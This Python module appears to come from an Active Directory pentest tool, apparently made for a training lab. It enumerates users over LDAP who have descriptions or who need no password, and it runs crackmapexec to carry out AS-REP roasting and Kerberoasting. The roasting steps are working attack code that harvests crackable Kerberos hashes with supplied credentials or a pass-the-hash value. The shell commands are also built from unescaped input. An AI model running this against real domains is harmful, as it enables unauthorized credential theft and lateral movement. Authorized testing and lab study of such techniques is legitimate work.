import ldap3
from ldap3 import *
from modules.clogging import Logging
import os

class UserEnumeration:
    """
    This enumerates users in the active directory instance who have a description linked to their account or
    who do not require a password. It also performs kerberoasting and asreproasting attacks.

    Num of LDAP queries: 2 + ?
    Created files: 4

    # TODO LIST
    # - rewrite roasting attacks to remove dependance on CME
    """
    def __init__(self, c: Connection, s: Server, save_dir: str, username: str, password: str, hash: str, dc_ip: str):
        self.c = c
        self.s = s
        self.save_dir = save_dir
        self.username = username
        self.password = password
        self.hash = hash
        self.domain_controller_ip = dc_ip

    def run(self):
        Logging.header("User Enumeration")

        default_search_base = self.s.info.other.get('DefaultNamingContext')[0]

        ##### Users with descriptions -> output to file (print number found)					(&(objectClass=user)(description=*))
        self.c.extend.standard.paged_search(search_base=default_search_base, search_filter='(&(objectClass=user)(description=*))', search_scope=ldap3.SUBTREE, attributes=["name", "description"], generator=False)

        count = 0
        with open(f"{self.save_dir}/full/users_dcsrp_full.txt", "w") as f:
            f.write(str(self.c.response))
            
        with open(f"{self.save_dir}/users_dcsrp.txt", "w") as f:
            for i in range(len(self.c.response)):
                if(self.c.response[i]["type"] == "searchResEntry"):
                    f.write(str(self.c.response[i]["attributes"]["name"]) + ": " + str(self.c.response[i]["attributes"]["description"]) + "\n")
                    count += 1

        Logging.info(f"Found {count} users with descriptions")


        ##### Users without a password set -> output to file (print number found)				(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))

        self.c.extend.standard.paged_search(search_base=default_search_base, search_filter='(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))', search_scope=ldap3.SUBTREE, attributes=["name"], generator=False)

        count = 0
        with open(f"{self.save_dir}/users_no_req_pass.txt", "w") as f:
            for i in range(len(self.c.response)):
                if(self.c.response[i]["type"] == "searchResEntry"):
                    f.write(str(self.c.response[i]["attributes"]["name"]) + "\n")
                    count += 1
            
        with open(f"{self.save_dir}/full/users_no_req_pass_full.txt", "w") as f:
            f.write(str(self.c.response))
            
        Logging.info(f"Found {count} users without required passwords")



        ##### Users where ASP-REP roasting is possible
        ####### Retrieve tickets -> output to file
        # TODO Make sure that there is a route to the nameserver (ie, cme needed dc01.inlanefreight.htb in /etc/hosts to work)
        # TODO Unauth ASREP roasting
        Logging.tool("CME", "ASREProasting Attack (output hidden)")
        if(self.hash):
            os.system(f"crackmapexec ldap {self.domain_controller_ip} -u {self.username} -H {self.hash} --asreproast {self.save_dir}/users_asreproast.txt > /dev/null")
        else:	
            os.system(f"crackmapexec ldap {self.domain_controller_ip} -u {self.username} -p {self.password} --asreproast {self.save_dir}/users_asreproast.txt > /dev/null")

        ######## Option to crack hashes in background

        ##### Users where Kerberoasting is possible
        ####### Retrieve tickets -> output to file

        # TODO same issue as above
        Logging.tool("CME", "Kerberoasting Attack (output hidden)")
        if(self.hash):
            os.system(f"crackmapexec ldap {self.domain_controller_ip} -u {self.username} -H {self.hash} --kerberoasting {self.save_dir}/users_kerberoasting.txt > /dev/null")
        else:
            os.system(f"crackmapexec ldap {self.domain_controller_ip} -u {self.username} -p {self.password} --kerberoasting {self.save_dir}/users_kerberoasting.txt > /dev/null")

        ######## Option to crack hashes in background?

        print("")
        print(f"Files saved in {self.save_dir} as users_*.txt")
